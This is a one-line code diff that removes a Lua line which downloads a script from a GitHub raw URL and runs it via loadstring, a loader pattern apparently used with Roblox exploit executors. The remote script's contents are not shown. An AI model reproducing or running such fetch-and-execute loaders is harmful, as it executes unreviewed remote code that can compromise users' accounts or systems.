@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/SussyImposterRed/Scripts/main/THE_W'))()
